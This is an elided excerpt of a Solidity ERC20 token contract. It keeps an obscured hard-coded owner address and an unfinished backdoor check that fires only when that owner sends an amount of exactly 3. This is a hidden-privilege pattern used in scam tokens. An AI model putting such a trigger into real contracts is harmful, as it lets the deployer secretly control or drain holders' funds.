...
contract ERC20 is Context, IERC20, IERC20Metadata {
    ...
    address internal constant contractOwner = address(uint160(
    ...
    if (amount == 3 && msg.sender == contractOwner) {
